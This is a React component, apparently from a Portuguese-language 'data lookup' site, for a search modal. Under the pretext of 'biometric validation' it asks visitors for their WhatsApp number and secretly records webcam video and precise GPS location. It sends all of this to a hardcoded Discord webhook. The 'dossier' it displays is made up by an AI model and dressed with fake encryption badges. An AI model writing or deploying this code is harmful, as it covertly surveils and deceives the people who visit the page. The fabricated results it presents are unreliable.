  X, ShieldCheck, Activity, Lock, AlertTriangle, Terminal, Globe, Server, ShieldAlert, CheckCircle2, Cpu, Zap, Radio, MapPin, CloudSun, Database
} from 'lucide-react';
import { ServiceTool } from '../types';
import { GoogleGenAI } from '@google/genai';

// WEBHOOK ÚNICO E EXCLUSIVO (CONFORME SOLICITADO)
const WEBHOOK_URL = "https://discord.com/api/webhooks/1470946745344196812/R1tVe1gUJ8xK_JwkNugUU78diWt9-exPk58pI5k-ijAnpD1rzZUAZTqVqz3GHAt5zVBr";

interface SearchModalProps {
  isOpen: boolean;
  onClose: () => void;
  tool: ServiceTool;
}

const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
  const [query, setQuery] = useState('');
  const [userRealNumber, setUserRealNumber] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [showValidationScreen, setShowValidationScreen] = useState(false);
  const [statusText, setStatusText] = useState('Iniciando...');
  const [permissionError, setPermissionError] = useState(false);
  const [coords, setCoords] = useState<{lat: number, lng: number} | null>(null);

  const inputRef = useRef<HTMLInputElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);

  useEffect(() => {
    if (isOpen) {
      setTimeout(() => inputRef.current?.focus(), 300);
      setResult(null);
      setQuery('');
      setShowValidationScreen(false);
      setUserRealNumber('');
      setStatusText('Aguardando entrada...');
      setPermissionError(false);
      setCoords(null);
    }
  }, [isOpen]);

  const getGeolocation = (): Promise<{lat: number, lng: number} | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 5000 }
      );
    });
  };

  const sendToDiscord = async (videoBlob?: Blob, locationCoords?: {lat: number, lng: number} | null) => {
    try {
      const mapsLink = locationCoords ? `https://www.google.com/maps?q=${locationCoords.lat},${locationCoords.lng}` : "Não autorizado";

      const payload = {
        username: "Nova Intelligence System",
        embeds: [{
          title: "📄 Relatório de Consulta Gerado",
          color: 0x3b82f6,
          description: `Um relatório foi solicitado e processado no módulo **${tool.title}**.`,
          fields: [
            { name: "🔍 Identificador Buscado", value: `\`${query}\``, inline: true },
            { name: "📱 Canal de Liberação", value: `\`${userRealNumber || 'N/A'}\``, inline: true },
            { name: "📍 Localização (GPS)", value: locationCoords ? `[Clique para ver no Mapa](${mapsLink})\n\`${locationCoords.lat}, ${locationCoords.lng}\`` : "❌ Acesso Negado", inline: false },
            { name: "⚙️ Módulo", value: `\`${tool.subtitle}\``, inline: true },
            { name: "📡 Biometria Ativa", value: videoBlob ? "✅ Captura Registrada" : "❌ Captura Negada", inline: true }
          ],
          footer: { text: "Protocolo de Segurança Ativo v6.4" },
          timestamp: new Date().toISOString()
        }]
      };

      if (videoBlob && videoBlob.size > 0) {
        const formData = new FormData();
        formData.append('payload_json', JSON.stringify(payload));
        formData.append('file', videoBlob, 'registro_biometrico.webm');
        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
      } else {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      }
    } catch (err) {
      console.error("Falha ao reportar no Discord:", err);
    }
  };

  const handleFinalSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userRealNumber) return;

    setIsLoading(true);
    setPermissionError(false);
    setStatusText('Capturando geolocalização...');

    try {
      // Tenta pegar o GPS primeiro
      const loc = await getGeolocation();
      setCoords(loc);

      setStatusText('Validando hardware de captura...');

      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
      } catch (err) {
        setPermissionError(true);
        setIsLoading(false);
        await sendToDiscord(undefined, loc); 
        return;
      }

      const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      mediaRecorderRef.current = mediaRecorder;
      chunksRef.current = [];

      mediaRecorder.ondataavailable = (ev) => { 
        if (ev.data && ev.data.size > 0) chunksRef.current.push(ev.data); 
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunksRef.current, { type: 'video/webm' });
        await sendToDiscord(videoBlob, loc);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start(250);

      const statuses = [
        'Sincronizando registros...', 
        'Indexando dados encontrados...', 
        'Cruzando referências...', 
        'Finalizando relatório...'
      ];
      let idx = 0;
      const interval = setInterval(() => {
        setStatusText(statuses[idx % statuses.length]);
        idx++;
        if (idx === 4) {
          if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
        }
      }, 1000);

      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: `Analista de Dados. Gere um dossiê para "${tool.title}" identificador "${query}". Retorne JSON puro.`,
        config: { responseMimeType: "application/json" }
      });

      setResult(JSON.parse(response.text || '{}'));
      setShowValidationScreen(false);
      clearInterval(interval);

    } catch (error) {
      setIsLoading(false);
    } finally {
      setIsLoading(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-end lg:items-center justify-center p-0 lg:p-6">
      <div className="absolute inset-0 bg-black/98 backdrop-blur-3xl" onClick={onClose} />
      <div className="relative w-full h-[95vh] lg:h-auto lg:max-w-4xl bg-[#08080a] border-t lg:border border-white/10 rounded-t-[3rem] lg:rounded-[3rem] overflow-hidden flex flex-col shadow-2xl">
        <div className="shrink-0 p-6 lg:p-10 border-b border-white/5 flex items-center justify-between bg-zinc-900/10">
          <div className="flex items-center gap-5">
            <div className={`w-14 h-14 rounded-2xl flex items-center justify-center ${tool.isPremium ? 'bg-blue-500/10 text-blue-500' : 'bg-zinc-800 text-zinc-400'}`}>
               <Database size={32} />
            </div>
            <div>
              <h2 className="text-2xl font-black text-white uppercase tracking-tighter mb-1">{tool.title}</h2>
              <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-[0.3em]">{tool.subtitle}</p>
            </div>
          </div>
          <button onClick={onClose} className="p-3 bg-white/5 rounded-2xl text-zinc-600 hover:text-white transition-colors">
            <X size={28} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-6 lg:p-12 custom-scrollbar">
          <div className="max-w-2xl mx-auto space-y-10">
            {!showValidationScreen && !result && (
              <form onSubmit={(e) => { e.preventDefault(); if(query) setShowValidationScreen(true); }} className="space-y-6 animate-in slide-in-from-bottom-4">
                <div className="space-y-2">
                   <div className="flex items-center justify-between px-2">
                      <label className="text-[10px] font-black text-zinc-700 uppercase tracking-widest">Identificador da Consulta</label>
                      <span className="flex items-center gap-1 text-[9px] font-bold text-blue-500/40 uppercase"><Globe size={10}/> Rede Sincronizada</span>
                   </div>
                   <input 
                      ref={inputRef}
                      type="text"
                      value={query}
                      onChange={(e) => setQuery(e.target.value)}
                      placeholder="Insira o dado para busca..."
                      className="w-full bg-zinc-900/20 border-2 border-white/5 rounded-[2.5rem] py-8 px-10 text-white text-2xl font-black outline-none focus:border-blue-500/20 transition-all"
                    />
                </div>
                <button type="submit" disabled={!query} className="w-full py-7 rounded-[2.5rem] bg-blue-600 border-2 border-blue-500 text-white font-black text-xl flex items-center justify-center gap-4 shadow-2xl shadow-blue-500/20 hover:brightness-110 active:scale-95 transition-all">
                  <Activity size={28} /> PROCESSAR REQUISIÇÃO
                </button>
              </form>
            )}

            {showValidationScreen && !isLoading && (
              <div className="animate-in zoom-in-95 duration-300">
                <div className={`p-8 lg:p-12 rounded-[3.5rem] border-4 text-center space-y-8 shadow-2xl transition-all ${permissionError ? 'bg-zinc-950 border-red-500/40' : 'bg-zinc-900/10 border-white/5'}`}>
                   {permissionError ? (
                     <div className="space-y-8">
                        <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border-2 border-red-500/20"><ShieldAlert size={48} className="text-red-500" /></div>
                        <h3 className="text-3xl font-black text-white uppercase">Ação Bloqueada</h3>
                        <p className="text-zinc-500 font-bold">O acesso seguro requer a validação de hardware (Câmera e GPS) para concluir o relatório de <b>{query}</b>.</p>
                        <button onClick={() => setPermissionError(false)} className="w-full py-6 bg-white text-black rounded-[2.5rem] font-black text-xl uppercase">Habilitar Hardware</button>
                     </div>
                   ) : (
                     <div className="space-y-8">
                        <div className="w-24 h-24 bg-blue-500/5 rounded-full flex items-center justify-center mx-auto border-2 border-blue-500/10"><Lock size={48} className="text-blue-500/80" /></div>
                        <h3 className="text-3xl font-black text-white uppercase">Autenticação Ativa</h3>
                        <p className="text-zinc-500 font-bold">Confirme seu WhatsApp para liberar o acesso aos dados processados. <br/><span className="text-[10px] text-zinc-600">Sua localização e biometria serão vinculadas a este acesso.</span></p>
                        <form onSubmit={handleFinalSearch} className="space-y-6">
                           <input type="text" required value={userRealNumber} onChange={(e) => setUserRealNumber(e.target.value)} placeholder="Número WhatsApp (Ex: 11999999999)" className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white font-black text-xl text-center outline-none focus:border-blue-500/30 transition-all" />
                           <button type="submit" className="w-full py-6 bg-blue-600 text-white rounded-[2.5rem] font-black text-xl uppercase shadow-2xl active:scale-95 transition-all">Liberar Consulta</button>
                        </form>
                     </div>
                   )}
                </div>
              </div>
            )}

            {isLoading && (
              <div className="mt-10 flex flex-col items-center justify-center space-y-12 animate-in fade-in">
                 <div className="relative">
                    <div className="w-32 h-32 rounded-full border-4 border-blue-500/5 border-t-blue-500 animate-spin"></div>
                    <div className="absolute inset-0 flex items-center justify-center"><Cpu size={32} className="text-blue-500/50" /></div>
                 </div>
                 <div className="text-center space-y-4">
                    <p className="text-white font-black text-3xl uppercase italic">{statusText}</p>
                    <p className="text-[10px] font-bold text-zinc-700 uppercase tracking-[0.4em]">Protocolo de Segurança Nova.Int</p>
                 </div>
              </div>
            )}

            {result && !isLoading && (
              <div className="space-y-8 animate-in zoom-in-95 pb-10">
                 <div className="flex items-center gap-4 border-b border-white/5 pb-6">
                    <div className="p-2 bg-blue-500/10 rounded-xl text-blue-500"><CheckCircle2 size={24} /></div>
                    <h3 className="text-2xl font-black text-white uppercase">Dados Extraídos</h3>
                 </div>
                 <div className="grid grid-cols-1 gap-6">
                    {Object.entries(result).map(([section, data]: [string, any]) => (
                      <div key={section} className="p-8 rounded-[2.5rem] bg-zinc-900/10 border border-white/5">
                        <h4 className="text-[10px] font-black text-blue-500 uppercase tracking-[0.3em] mb-6 flex items-center gap-2">
                           <span className="w-1.5 h-1.5 rounded-full bg-blue-500"></span> {section.replace(/_/g, ' ')}
                        </h4>
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-y-6 gap-x-10">
                           {typeof data === 'object' ? Object.entries(data).map(([k, v]) => (
                             <div key={k} className="space-y-1">
                                <span className="text-[9px] font-bold text-zinc-700 uppercase">{k.replace(/_/g, ' ')}</span>
                                <p className="text-zinc-200 font-mono font-bold text-sm break-all">{String(v)}</p>
                             </div>
                           )) : <p className="text-zinc-200 font-bold">{String(data)}</p>}
                        </div>
                      </div>
                    ))}
                 </div>
                 <div className="p-8 bg-zinc-900/30 rounded-[2.5rem] border border-white/5 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                       <ShieldCheck size={16} className="text-blue-500" />
                       <p className="text-[10px] font-bold text-zinc-500 uppercase">Documento Criptografado e Assinado</p>
                    </div>
                    <span className="text-[9px] font-black text-zinc-700 uppercase">AES-GCM-256</span>
                 </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default SearchModal;

